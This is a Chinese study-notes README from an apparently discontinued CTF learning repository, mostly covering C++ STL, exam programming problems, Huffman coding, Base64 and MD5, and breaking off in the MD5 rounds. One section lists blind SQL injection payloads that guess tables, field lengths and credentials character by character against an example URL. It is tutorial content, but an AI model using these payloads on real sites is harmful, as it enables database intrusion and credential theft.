# Feb 2018 Notes

> 由于不再从事安全方面的学习，此repo停止更新

# 2019年3月25日 声明

本文遵循 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh) 协议，程序代码遵循 [MIT](LICENSE) 协议

允许参考本文中的解题思路、算法笔记等内容

### **禁止**参加**OUC研究生复试**考生**复制**本文，**一经发现，后果自负**

<!-- # 2019年3月18日 声明

**禁止**参加**中国海洋大学计算机系研究生复试考生**复制本项目，一经发现，后果自负

发现19届考生[WangQiuChenChen](https://github.com/WangQiuChenChen)复制本项目

![](assets/1.jpg)

抄袭内容（部分）：

1. [WangQiuChenChen/thinking/misc-Email](https://wangqiuchenchen.github.io/thinking/misc-Email/)
   
   ![](assets/2.jpg)
      
   本文链接：
   
   [Misc Email](https://github.com/sunyufei/CTF#misc-email)
   
   [Base64 编码解码(约30分)](https://github.com/sunyufei/CTF#base64-%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E7%BA%A630%E5%88%86)
   
2. [WangQiuChenChen/thinking/misc-shell](https://wangqiuchenchen.github.io/thinking/misc-shell/)
   
   ![](assets/3.jpg)
   
   本文链接：
   
   [Misc Shell](https://github.com/sunyufei/CTF#misc-shell) -->


# 2月28日 更新

## STL String 应用：VSCode调用WSL编译运行单文件（约2小时）

VSCode是一个代码编译器，支持多种语言，编译运行单一文件不是很方便，可以通过插件Launcher开启CMD窗口，调用第三方程序执行一些命令，这里借用这个插件实现调用WSL编译运行单个文件

1.Windows调用WSL运行Linux程序的命令的方法

```
bash -c "linux command"
如：
bash -c "gcc a.cpp -o a.out"
```

2.现需要使用C++编写一个调用WSL编译运行单文件的程序，程序使用方法

```cmd
bashrun C:\Project\Project1\main.cpp
```

所以需要使用argc和argv[]

```c
int main(int argc, char **argv) {
    if (argc == 2) {
        // ...
    }
    return 0;
}
```

3.对参数argv[1]的操作：将Windows文件路径转换为Linux格式

```
C:\Project\Project1\main.cpp
==>
/mnt/c/Project/Project1/main.cpp
```

3.1 大写盘符转小写，使用string.h里的tolower()函数
```c
path[0] = tolower(path[0]);
```

3.2 去掉":"，使用replace()函数，与find()函数进行结合
```cpp
path.replace(path.find(":"), 1, "");
```

3.3 将所有"\"换为"/"

string的replace函数一次只能替换一个匹配字符，文件路径中有多个匹配字符，写了一个函数用于替换所有匹配字符

上面的替换方法中没有对find()函数的返回值进行检测

```cpp
void replace_all(string &str, const string &from, const string &to) {
    string::size_type pos(0);
    while (true) {
        if ((pos = str.find(from)) != string::npos)
            str.replace(pos, from.length(), to);
        else
            break;
    }
}
```

3.4 在路径前面加上"/mnt/"

WSL将Windows的磁盘挂载在/mnt/目录下

```cpp
path = "/mnt/" + path;
```

4.提取文件扩展名

从
```
/mnt/c/Project/Project1/main.cpp
```
中提取到"cpp"，只需找到最后一个"."后面的所有字符即可，使用substr()函数

```cpp
void split_name(const string &filename, string &basename, string &extname) {
    int p = 0, i;
    for (i = 0; i < filename.size(); i++)
        if (filename[i] == '.')
            p = i;
    string::size_type pos(p);
    basename = filename.substr(0, pos);
    extname = filename.substr(pos);
}
```

5.根据扩展名类型选择编译运行命令

```cmd
gcc -std=c99 -Wall %FILENAME% -o "%BASENAME%.out" && "%BASENAME%.out"

g++ -std=c++11 -Wall %FILENAME% -o "%BASENAME%.exe" && "%BASENAME%.exe"

javac %FILENAME% && java %BASENAME%

py %FILENAME%
```

需要在这些编译运行命令前面加上`bash -c`，并将这些命令用双引号括起来

## So you want to work in security? （约90分）

你是否想从事安全工作？

作者Ivan Fratric是一名引用程序安全人员，是Google Project Zero的成员。

安全领域的一些方向：漏洞研究、安全审查、错误狩猎、黑客攻击、安全开发、恶意软件分析、基础设施安全等。

从事安全工作需要自己做点东西。很多人在从事安全工作之前将其当成一种业余爱好。

现在从事安全领域比10年前更困难。随着时间的推移，安全性有了很大的提高，但相关的领域对安全人员的要求更加高了。

现在学习资源比以前多得多，但没有人会手把手领着你去学习，你需要自己去学习。如果遵循预先设定的课程，不会在安全方面走太远。

在获得正确的学习资源之前需要问两个问题：

1.我感兴趣的软件/硬件如何工作？基于什么技术？有无可阅读源码、教程、图书？

2.有人设法打破了我想要打破的软件/硬件吗？他们发布了教程、漏洞、介绍吗？我明白他们做了什么吗？

这两个问题告诉我们，我们需要在技术上精通他人制作的真实硬件或软件的工作方式。

遇到不了解的事情时，不要放弃。特别是在开始阅读新的资源时。要善于向别人提问。

多使用社交网络（如Twitter），很多安全社区通过twitter分享新闻。

玩CTF时一个很好的学习方式，CTF可以增长自己的经验。

在真实世界中，不要害怕失败，虽然这会经常发生。

漏洞研究时的大部分尝试不起作用，但需要接受，不要阻止自己的进一步尝试。这种情况会发生在所有人身上。如果失败，继续之前需要找到失败的原因。

你比自己想象的更聪明。比如说你认为自己的想法开发人员一定会想到，但事实上有时候自己的想法开发人员想不到。

很多公司为那些在其产品中发现缺陷的研究人员提供奖励。

安全研究人员生活不会像想象中的光彩照人，熬夜、长时间坐在电脑前将会是家常便饭。

# 2月27日 更新

## SQL注入 Part 2(约90分)

以 http://www.abc.com/index.php?id=1 为例，分析注入语句

在URL中传递变量id，值为1，后台会进行查询请求

1.判断有无注入点
```sql
and 1=1 and 1=2
and '1'='1' and '1'='2'
```

2.猜表名，常见的admin, adminuser, user, pass, password等

```sql
and 0<>(select count(*) from *) 
and 0<>(select count(*) from admin)
```

其中第二句指出了判断是否存在admin表

3.猜帐号数目

如果遇到 0<返回正确页面、1<返回错误页面，说明帐号数目就是1个
```sql
and 0<(select count(*) from admin) 
and 1<(select count(*) from admin)
```

4.猜解字段名称，在len()括号里面加上我们想到的字段名称
```sql
and 1=(select count(*) from admin where len(*)>0)-- 
and 1=(select count(*) from admin where len(用户字段名称)>0) 
and 1=(select count(*) from admin where len(_blank>密码字段名称)>0)
```

5.猜解各个字段的长度，猜解长度就是把>0变换，直到返回正确页面为止
```sql
and 1=(select count(*) from admin where len(*)>0) 
and 1=(select count(*) from admin where len(name)>6) -- 错误 
and 1=(select count(*) from admin where len(name)>5) -- 正确 长度是6 
and 1=(select count(*) from admin where len(name)=6) -- 正确

and 1=(select count(*) from admin where len(password)>11) // 正确 
and 1=(select count(*) from admin where len(password)>12) // 错误 长度是12 
and 1=(select count(*) from admin where len(password)=12) // 正确
```

6.猜解字符 
```sql
and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位 
and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位 
```
就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 

7.ASCII逐字解码法的应用

```sql
and (select count(*) from admin)<>0 --猜解表名
and (select count(列名) from 表名)<>0 --猜解列名
and (select len(列名) from 表名)>=1、>=2、>=3、>=4--猜解用户名的长度
and (select count(*)from 表名 where (asc(mid(列名,1,1))) between 30 and 130)<>0--猜解用户名
```

## 机试试题 Part 6(约90分)

### STL String

```cpp
#include <string>
using namespace std;

// 构造函数
string s;
string s(str);          // 从str中复制
string s(str, index);   // 部分复制[index,end]
string s(str, index, n);// 部分复制[index, index + n]
string s(c_str);        // 从C字符串复制
string s(c_str, n);     // 从C字符串部分复制[0,n]
string s(10, 'a');      // 10个'a'

// 长度
s.empty();              // 判断是否为空
s.size();
s.capacity();

// 插入删除
s.push_back('a');
s.insert();
s.erase(start, end);
s.clear();

// 替换字符
s.replace();
s.swap();

// 迭代器
s.begin();
s.end();
s.rend();
s.rbegin();

// 与C标准字符串转换
s.c_str();
s.data();

// 查找
s.find('a');    // 返回字符所在位置

// 子串
s.substr(i, j); // [i, j]范围子串

// 比较
s.compare(str); // 相等0，大于1，小于-1
```

字符处理
```cpp
#include <cctype>

isalnum(c); // 如果c是字母或数字，返回 true
isalpha(c); // 如果c是字母，返回true
iscntrl(c); // c是控制符，返回true
isdigit(c); // 如果c是数字，返回true
isgraph(c); // 如果c不是空格，则为true
islower(c); // 如果c是小写字母，则为true
isupper(c); // 如果c是大写字符，则为true
isprint(c); // 如果c是可打印的字符，则为true
ispunct(c); // 如果c是标点符号，则为true
isspace(c); // 如果c是空白字符，则为true
isxdigit(c); // 如果c是十六进制数，则为true
tolower(c); // 如果c是大写字符，则返回其小写字母，否则直接返回c
toupper(c); // 跟tolower相反
```

IPv4题目中对IP地址的分段中利用find()和substr()函数可以实现通过关键字符'.'对IP地址进行分段

其他类型与string类型的转换

C++不能直接把int等转换成string 类型，因此需要用sstring 中的字符串输出流来写一个转换string 类型的函数

```cpp
#include <iostream>
#include <string>
#include <sstream>
using namespace std;

template <class T>
string toString(const T &t) {
    ostringstream os;
    os << t;
    return os.str();
}

template <class T>
T fromString(const string &s) {
    istringstream is(s);
    T temp;
    is >> temp;
    return temp;
}
```

# 2月26日 更新

## SQL 注入 Part 1(约1小时)

SQL注入时通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意代码的SQL命令

它利用现有应用程序，将恶意的SQL命令注入到后台数据库引擎执行的能力

SQL常用语句

1.SELECT语句，从数据库中选取数据

```sql
SELECT 列名1, 列名2, ... | *
FROM 表名;
```
2.DISTINCT关键字

使用DISTINCT关键字可以返回唯一不同的值
```sql
SELECT DISTINCT ...
FROM ...;
```

3.WHERE

WHERE子句用于提取满足指定标准的记录
```sql
SELECT ...
FROM ...
WHERE 列名 运算符 关键字;
```

常见运算符：=、<>、>、<、>=、<=、BETWEEN、LIKE、IN

IN用于指定针对某个列的多个可能值

4.AND和OR

AND 和 OR 运算符用于基于一个以上的条件对记录进行过滤

```sql
SELECT *
FROM _table
AND|OR column_name operator _value;
```

5.ORDER BY

用于对结果集按照一个或多个列进行排序，默认升序，若需要降序，使用 DESC 关键字

```sql
SELECT *
FROM _table
ORDER BY column_name, ... ASC|DESC;
```

6.INSERT INTO

用于向表中插入新纪录

```sql
INSERT INTO _table [(column1, column2, ...)]
VALUES (value1, value2, ...)
```

7.UPDATE

用于更新已存在的记录，常与WHERE搭配使用，若不使用WHERE语句，会将所有的记录更新

```sql
UPDATE _table
SET column1 = value1, column2 = value2, ...
WHERE column = value;
```

例如
```sql
UPDATE Student
SET name='Zhang San'
WHERE id='201401001';
```

8.DELETE

用于删除表中的行，与UPDATE相同，需要和WHERE语句配合使用，若不使用WHERE语句，将会删除所有记录

```sql
DELETE FROM _table
WHERE column = value;
```

## 机试试题 Part 5（约3小时）

### STL Vector

Vector可以理解为变长数组，与数据结构中的顺序线性表功能相近

Vector在访问元素、末尾添加和删除元素相对高效；在其他位置插入、删除元素效率低

常见用法：
```cpp
#include <vector>
using namespace std;

// 声明及初始化
vector<int> v;
vector<int> v(5);       // 初始大小5
vector<int> v(10, 1);   // 初始大小10，所有元素1
vector<int> t(v.begin(), v.end());      // 用v初始化t
vector<int> t(v.begin(), v.begin() + 3);
int a[5];
vector<int> v(a, a + 5);    // 用数组初始化v

// 容量
v.size();       // 向量大小
v.capacity();   // 真实大小
v.empty();      // 判断是否为空

// 修改
v.push_back(type_t value);  // 尾部添加元素
v.pop_back();               // 尾部删除元素
v.insert();     // 任意位置插入
v.erase();      // 任意位置删除
v.clear();      // 清空

// 迭代器
v.begin();      // 第一个元素
v.end();        // 最后一个元素的下一个

// 元素访问
v[1];
v.at(1);        // 有越界检查
v.front();
v.back();

// 遍历
vector<int>::iterator it;
for(it = v.begin(); it < v.end(); it++)
    cout << *it << endl;

// 逆转
#include <algorithm>
reverse(v.begin(), v.end());

// 排序
sort(v.begin(), v.end());
bool comp(cosnt int &a, const int &b) {
    return a > b;
}
sort(v.begin(), v.end(), comp);
```

### STL List

List为数据结构中的链表，STL List的实现方式是双向链表

初始化、容量、修改、迭代器、元素访问、遍历、逆转与Vector类似

```cpp
#include <list>
using namespace std;

// 链表交换
a.swap(b);
swap(a, b); //都可以完成a链表和b链表的交换

// 融合
a.merge(b);
a.merge(b, greater<int>()); // b清空，a中元素包含原来a和b的元素
```

### STL Stack/Queue

Stack为数据结构中的栈，具有后进先出的特点（LIFO）

```cpp
#include <stack>
using namespace std;

// 初始化
stack<int> s;

// 入栈
s.push(1);

// 出栈
s.pop();

// 访问栈顶元素
s.top();

// 判断栈空
s.empty();

// 元素个数
s.size();
```

Queue为数据结构中的队列，具有先进先出的特点（FIFO）

```cpp
#include <queue>
using namespace std;

queue<int> q;

// 入队列
q.push(1);

// 出队列
q.pop();

// 访问队首元素
q.front();

// 访问队尾元素
q.back();

// 判断队列是否为空
q.empty();

// 元素个数
q.size();
```

### STL priority_queue

优先队列，根据队列中元素的优先权顺序出队列，默认大者优先

```cpp
#include <queue>
using namespace std;

priority_queue<int> q1;
priority_queue<pair<int, int> > q2;
priority_queue<int, vector<int>, greater<int> > q3; // 默认为less<int>
```

其他的操作与Queue相同

### STL Set

set集合容器实现了红黑树的平衡二叉检索树的的数据结构，在插入元素时，它会自动调整二叉树的排列，把该元素放到适当的位置，以确保每个子树根节点的键值大于左子树所有节点的键值，而小于右子树所有节点的键值；

确保根节点的左子树的高度与有字数的高度相等，这样，二叉树的高度最小，从而检索速度最快，检索使用中序遍历算法。

不会重复插入相同键值的元素，而采取忽略处理。

### 5种容器比较

如果容器中的数据需要随机访问，vector比list好

如果需要经常插入和删除数据，list比vector好

如果既要随机存取，又要关心两端数据的插入和删除，选择deque

set与其他容器的区别在于不存放重复值，以存放的值排序

### 其他类型与string类型的转换

C++不能直接把int等转换成string 类型，因此需要用sstring 中的字符串输出流来写一个转换string 类型的函数

```cpp
#include <iostream>
#include <string>
#include <sstream>
using namespace std;

template <class T>
string toString(const T &t) {
    ostringstream os;
    os << t;
    return os.str();
}

template <class T>
T fromString(const string &s) {
    istringstream is(s);
    T temp;
    is >> temp;
    return temp;
}
```

# 2月25日 更新

## 机试试题 Part 4（约4小时）

### 一元二次方程

题目要求，求解一元二次方程ax<sup>2</sup>+bx+c=0的解，要求考虑到所有情况

题目很简单，考查的是if语句
```c
double delta = b * b - 4 * a * c;
if (delta > 0) {
    // ...
} else if (delta == 0) {
    // ...
} else {
    // ...
}
```

### 数字之和（递归函数）

请设计一个递归函数，求出某个正整数的各位数字之和

该函数的雏形为：int sumDigits(int n);

例如：sumDigits(123456) = 21

简单来说，递归函数就是自己调用自己。递归函数的基本形式

```
返回值 func(参数) {
    if (递归终止条件 == true) {
        return 
    }
    // 递归部分
    func(新参数)
}
```

就本题来说
```
sumDigits(123456) = 6 + sumDigits(12345)
sumDigits(12345)  = 5 + sumDigits(1234)
sumDigits(1234)   = 4 + sumDigits(123)
sumDigits(123)    = 3 + sumDigits(12)
sumDigits(12)     = 2 + sumDigits(1)
sumDigits(1)      = 1
```

根据前几步的计算，可以得到递归函数的递归部分
```c
return n % 10 + sumDigits(n / 10);
```

最后一步的计算可以看作递归函数的终止条件

```c
if(n < 10)
    return n;
```

整合起来
```c
int sumDigits(int n) {
    if (n < 10)
        return n;
    return n % 10 + sumDigits(n / 10);
}
```

### 虚函数

虚函数是在基类中声明为virtual，在派生类中重新定义的成员函数，实现多态性。

指向基类的指针在操作它的多态类对象时，会根据不同的类对象，调用其相应的函数

先实现一个简单的类的继承

```cpp
class A {
    public:
        void print() {
            cout << "A\n";
        }
};

class B : public A {
    public:
        void print() {
            cout << "B\n";
        }
};

int main() {
    A a;
    B b;
    a.print();  // A
    b.print();  // B
    return 0;
}
```

输出不同

通过class A和class B的print()接口，可以看出这两个类因个体的差异而采用了不同的策略，但这并不是多态性行为（使用的是不同类型的指针），没有用到虚函数的功能。

若在main()中加入指针

```cpp
int main() {
    A a;
    B b;
    A *p1 = &a;
    A *p2 = &b;
    p1->print();    // A
    p2->print();    // A
    return 0;
}
```

此时输出全为A。p2指向class B的对象，但没有调用class B的print()函数，解决这个问题需要使用虚函数

```cpp
class A {
    public:
        virtual void print() {
            cout << "A\n";
        }
};

class B : public A {
    public:
        void print() {
            cout << "B\n";
        }
};

int main() {
    A a;
    B b;
    A *p1 = &a;
    A *p2 = &b;
    p1->print();    // A
    p2->print();    // B
    return 0;
}
```

问题解决

实例（机试试题）：

题目要求（部分）：

先建立一个房间类，用纯虚函数定义计算房间面积函数
 
再建立一个“方形房间类”和“圆形房间类”，继承房间类，并分别对虚函数重新定义实现各自的面积计算。
 
```cpp
class Room {
  public:
    virtual double area() { return 0; }
};

class CircleRoom : public Room {
  private:
    double radius;
    double height;

  public:
    CircleRoom(double radius = 0, double height = 0)
        : radius(radius), height(height) {}
    double area() { return 3.1415926 * radius * radius * height; }
};

class RectRoom : public Room {
  private:
    double length;
    double width;
    double height;

  public:
    RectRoom(double length = 0, double width = 0, double height = 0)
        : length(length), width(width), height(height) {}
    double area() { return length * width * height; }
};
```

### 顺序查找

平时写的顺序查找算法

```c
int search(int a[], int n, int key) {
    for(int i = 0; i < n; i++)
        if(a[i] == key)
            return i;
    return -1;
}
```

可以看到需要每次查看下标是否越界

原始数组

下标|0|1|2|3|4|5|6
:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:
数据|12|23|10|33|26|76|2

现将数组元素整体后移一位，第下标0元素空出来

下标|0|1|2|3|4|5|6|7
:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:
数据||12|23|10|33|26|76|2

在进行查找的时候，将要查找的元素（以10为例）放到0号位

下标|0|1|2|3|4|5|6|7
:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:
数据|*10*|12|23|10|33|26|76|2

从后向前查找，此时不需要每次都确认数组是否越界

```cpp
int search(int a[], int n, int key) {
    a[0] = key;
    for(int i = n - 1; ; --i) 
        if(a[i] == key)
            return i;
}
```

返回值为3

当查找一个数组中不存在的元素（以50为例）时

下标|0|1|2|3|4|5|6|7
:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:
数据|*50*|12|23|10|33|26|76|2

循环变量i在减为0时，函数运行结束，“找到”了50，返回0

# 2月24日 更新

## 机试试题 Part 3(约4小时)

### Huffman编码

Huffman编码根据字符出现的次数来构造平均长度最短的码字，是二叉树的一种应用

压缩过程（以ABCDEABCDABCABA为例）：

第一步，统计字符及其出现次数，并计算出出现概率

字符|A|B|C|D|E
:-:|:-:|:-:|:-:|:-:|:-:
出现次数|5|4|3|2|1
出现频率|0.33|0.27|0.2|0.13|0.07

取概率最低的D、E为二叉树最高层的叶子，分别设为0、1，D+E的概率为0.2，加入到表格中，取代原来的D和E，并重新排序

字符|A|B|C|D+E
:-:|:-:|:-:|:-:|:-:
出现频率|0.33|0.27|0.2|0.2

字符|A|B|C|D|E
:-:|:-:|:-:|:-:|:-:|:-:
当前编码||||0|1

重复上述方法，取概率最低的C和D+E为次高层叶子，分别设为0、1，C+D+E的概率为0.4，加入到表格中，取代原来的C和D+E，并重新排序

字符|C+D+E|A|B
:-:|:-:|:-:|:-:
出现频率|0.4|0.33|0.27

字符|A|B|C|D|E
:-:|:-:|:-:|:-:|:-:|:-:
当前编码|||0|10|11

重复上述方法，取A、B为次高层叶子，分别设为0、1，A+B的概率为0.6，加入到表格中

字符|A+B|C+D+E
:-:|:-:|:-:
出现频率|0.6|0.4

字符|A|B|C|D|E
:-:|:-:|:-:|:-:|:-:|:-:
当前编码|0|1|0|10|11

最后，将剩余的两个结点合并，设高概率的A+B为0，低概率的C+D+E为1，最终编码

字符|A|B|C|D|E
:-:|:-:|:-:|:-:|:-:|:-:
当前编码|00|01|10|110|111

将字符串转换为Huffman编码：

000110110111000110110000110000100

### 保险箱类

题目要求：

建立一个用数字作为密码，存放一个字符串的保险箱类，它具有以下成员函数：

1）一个构造函数，接受一个数字作为初始密码

2）另一个构造函数，没有指定初始密码，此时初始密码默认为0，不允许使用默认参数

3）一个开箱门函数，给定一个密码，如果密码正确，则保险箱开箱，否则保持状态不变

4）一个锁箱门函数，没有参数，将保险箱锁定

5）一个更新内容函数，在开箱的情况下，更新保险箱内存放的字符串

6）一个取出内容函数，在开箱的情况下，在屏幕上输出存放的字符串

7）一个更改密码函数，在开箱的情况下，更新保险箱的密码

根据题目要求，建立类的框架：

```cpp
class Safe {
  private:
    int password;
    string str;
    bool is_open;

  public:
    Safe(string str);
    Safe(int password, string str);
    bool Open(int password);
    void Close();
    bool Update(string str);
    void Show();
    bool ChangePassword(int password);
};
```

构造函数

如果题目不要求不允许使用默认参数，构造函数可以写成
```cpp
Safe(int password = 0, string str) {
    this->password = password;
    this->str = str;
    this->is_open = false;
}
```

根据题意，构造函数应当重载
```cpp
Safe(string str) : password(0), str(str), is_open(false) {}
Safe(int password, string str) : password(password), str(str), is_open(false) {}
```

开门函数，将实参密码与对象的密码进行比较，相同则打开，不同则关上
```cpp
bool Open(int password) {
    if (password == this->password)
        is_open = true;
    else
        is_open = false;
    return is_open;
}
```

关门函数相对简单，无论保险箱是否开启，将其关闭即可。可以将其设为内联函数

```cpp
inline void Close() {
    is_open = false;
}
```

更新内容与修改密码相似
```cpp
bool Update(string str) {
    if (is_open)
        this->str = str;
    return is_open;
}

bool ChangePassword(int password) {
    if (is_open)
        this->password = password;
    return is_open;
}
```

取出内容
```cpp
void Show() {
    if (is_open)
        cout << str << endl;
    else
        cout << "Safe Closed.\n";
}
```

### 输出从2开始的前500个质数

题目的关键在于质数的判断，判断从2到sqrt(n)即可，这样可以减少运算次数，提高程序性能

```cpp
bool is_prime(int n) {
    for (int i = 2; i <= sqrt(n); i++)
        if (n % i == 0)
            return false;
    return true;
}
```

### 顺序线性表

题目要求：

N个人围成一圈，1，2，3循环报数，报到3的人退出

并将退出的序号一次存到数组p中，包括最后一个人的序号

到最后剩余一人，输出最后留下的是第几号（最初的以1起始）及退出的顺序

如N=6，输出1，3 6 4 2 5 1

N=10，输出4， 3 6 9 2 7 8 5 10 4

函数int fun(int n, int *p);实现上述功能，返回N个人中最后余的1人的起始序号，并将退出的序号顺序写入p指向的数组中

此题是顺序线性表的应用，简易的顺序线性表的实现
```cpp
class Sequence {
    private:
        int *p;
        int length;
        int size;
    public:
        Sequence(int size) {
            this->size = size > 0 ? size : 10;
            p = new int[size];
            length = 0;
        }

        bool Insert(int index, int data) {
            if(index < 0 || index > length)
                return false;
            for(int i = length; i > index; --i)
                p[i] = p[i - 1];
            p[index] = data;
            length++;
            return true;
        }

        bool Delete(int index) {
            if(index < 0 || index >= length)
                return false;
            for(int i = index; i < length; ++i)
                p[i] = p[i + 1];
            return true;
        }

        bool GetData(int index, int &data) {
            if(index < 0 || index >= length)
                return false;
            data = p[index];
            return true;
        }
};
```

根据题目要求，可以每次取出第3、6、9...(int)(length/3)个数，一次存到p中，直到length==1

# 2月23日 更新

## Base64 编码解码(约30分)

Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。定义Base64的RFC文档同样定义了MIME的详细规范

MISC Email题目中WireShark捕获到了以Base64为编码的邮件附件

Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息，采用Base64编码具有不可读性，需要解码后才能阅读

简单来说，Base64编码就是将3个字节的信息拆分为4个6位，最高两位补0，形成4个字节的信息

如：
```
        abc
ASCII:  97 98 99
Bin:    01100001 01100010 01100011
分组：   011000 010110 001001 100011
补0：    00011000 00010110 00001001 00100011
Oct:    30 26 11 43
查表：   e a L r
```

Java、Python、Go等编程语言都有对Base64编码的实现，C++实现Base64涉及位运算符`>>`和`<<`

## 机试试题 Part 2(约4小时)

### 行程编码

行程编码是数据压缩的一种编码方式

其基本原理是：用一个符号值和串长代替具有相同值的连续符号

如：

输入：AAAADDEEEEEEGGFFFFFFF

输出：A4,D2,E6,G2,F7

编写程序实现上述功能，输入为连续字母，输出按上述格式

1.字母计数

可以申请一个长为128的int数组，数组元素下标为字母的ASCII值

```c
int value[128] = {0};
for (...) {
    value[s[i] - '\0']++;
}
```

2.字符串去重

从题目给出的输入输出样例中可以看到，输出时不是按照字母的顺序输出的，需要对源字符串进行去重操作，按照去重后的字符串进行输出。

STL Vector的去重：
```c++
#include <algorithm>
#include <vector>
using namespace std;

vector<char> key;
vector<char>::iterator it;

it = unique(key.begin(), key.end());
key.erase(it, key.end());
```

### 字符串匹配定位

题目要求：

编写函数int locStr(charstr1, charstr2)实现字符串匹配的定位功能，若字符串str1中含有字符串str2，则返回字符串str2在字符串str1中的位置，否则返回-1

题目可以使用二层for循环实现，时间复杂度为O(mn)，m、n分别为两个字符串的长度

KMP算法是一种改进的字符串匹配算法，KMP算法的关键是利用匹配失败后的信息，尽量减少模式串与主串的匹配次数以达到快速匹配的目的。具体实现就是实现一个next()函数，函数本身包含了模式串的局部匹配信息。时间复杂度O(m+n)。

在KMP算法中，对于每一个模式串我们会事先计算出模式串的内部匹配信息，在匹配失败时最大的移动模式串，以减少匹配次数。

右移的距离在KMP算法中是如此计算的：在已经匹配的模式串子串中，找出最长的相同的前缀和后缀，然后移动使它们重叠。

如果每次计算右移的距离，会耗费很长的时间，可以使用辅助数组来存放一些信息供后面使用

### MD5计算

1.MD5简介

MD5，消息摘要算法第五版，为计算机安全领域广泛使用的一种散列函数，能够将数据运算为固定长度的一个值。具有压缩性、容易计算、抗修改性、强抗碰撞的特点

MD5可以用于信息一致性验证，比如网上下载文件时可以提供一个文件的MD5值，用于验证下载的文件是否正确完整。

MD5也可用于数字签名，以防止被篡改

现如今MD5算法已不安全，被更先进的SHA1等算法替代

2.MD5算法原理

MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。

第一步：填充

对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。

填充方法：在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。

经过这两步的处理，信息的位长=N
512+448+64=(N+1)
512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。

第二步：初始化变量

初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为： A=0x01234567，B=0x89ABCDEF，C=0xFEDCBA98，D=0x76543210。

（大端字节序：高字节存于内存低地址，低字节存于内存高地址）

第三步：处理分组数据

第一分组需要将上面四个链接变量复制到另外四个变量中：A到a，B到b，C到c，D到d。从第二分组开始的变量为上一分组的运算结果，即A = a， B = b， C = c， D = d

主循环有四轮，每轮循环都很相似。第一轮进行16次操作。每次操作对a、b、c和d中的其中三个作一次非线性函数运算，然后将所得结果加上第四个变量、文本的一个子分组和一个常数。再将所得结果向左环移一个不定的数，并加上a、b、c或d中之一。最后用该结果取代a、b、c或d中之一。

每轮使用的非线性函数（每轮一个）

F(X, Y, Z) = ( X & Y) | ( (~X) & Z)

G(X, Y, Z) = ( X & Z) | ( Y & (~Z))

H(X, Y, Z) = X ^ Y ^ Z

I(X, Y, Z) = Y ^ ( X | (~Z))

假设Mj表示消息的第j个子分组（从0到15），常数ti是2<sup>32</sup>*abs(sin(i)）的整数部分，i 取值从1到64，单位是弧度。

现定义：

FF(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ((a + F(b,c,d) + Mj + ti) << s)

GG(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ((a + G(b,c,d) + Mj + ti) << s)

HH(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ((a + H(b,c,d) + Mj + ti) << s)

II(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ((a + I(b,c,d) + Mj + ti) << s)

则四轮64步操作为：

第一轮

FF(a ,b ,c ,d ,M0 ,7 ,0xd76aa478)；FF(d ,a ,b ,c ,M1 ,12 ,0xe8c7b756)；FF(c ,d ,a ,b ,M2 ,17 ,0x242070db)；FF(b ,c ,d ,a ,M3 ,22 ,0xc1bdceee)

FF(a ,b ,c ,d ,M4 ,7 ,0xf57c0faf)；FF(d ,a ,b ,c ,M5 ,12 ,0x4787c62a)；FF(c ,d ,a ,b ,M6 ,17 ,0xa8304613)；FF(b ,c ,d ,a ,M7 ,22 ,0xfd469501)

FF(a ,b ,c ,d ,M8 ,7 ,0x698098d8)；FF(d ,a ,b ,c ,M9 ,12 ,0x8b44f7af)；FF(c ,d ,a ,b ,M10 ,17 ,0xffff5bb1)；FF(b ,c ,d ,a ,M11 ,22 ,0x895cd7be)

FF(a ,b ,c ,d ,M12 ,7 ,0x6b901122)；FF(d ,a ,b ,c ,M13 ,12 ,0xfd987193)；FF(c ,d ,a ,b ,M14 ,17 ,0xa679438e)；FF(b ,c ,d ,a ,M15 ,22 ,0x49b40821)

第二轮

GG(a ,b ,c ,d ,M1 ,5 ,0xf61e2562)；GG(d ,a ,b ,c ,M6 ,9 ,0xc040b340)；GG(c ,d ,a ,b ,M11 ,14 ,0x265e5a51)；GG(b ,c ,d ,a ,M0 ,20 ,0xe9b6c7aa)

GG(a ,b ,c ,d ,M5 ,5 ,0xd62f105d)；GG(d ,a ,b ,c ,M10 ,9 ,0x02441453)；GG(c ,d ,a ,b ,M15 ,14 ,0xd8a1e681)；GG(b ,c ,d ,a ,M4 ,20 ,0xe7d3fbc8)

GG(a ,b ,c ,d ,M9 ,5 ,0x21e1cde6)；GG(d ,a ,b ,c ,M14 ,9 ,0xc33707d6)；GG(c ,d ,a ,b ,M3 ,14 ,0xf4d50d87)；GG(b ,c ,d ,a ,M8 ,20 ,0x455a14ed)

GG(a ,b ,c ,d ,M13 ,5 ,0xa9e3e905)；GG(d ,a ,b ,c ,M2 ,9 ,0xfcefa3f8)；GG(c ,d ,a ,b ,M7 ,14 ,0x676f02d9)；GG(b ,c ,d ,a ,M12 ,20 ,0x8d2a4c8a)

第三轮

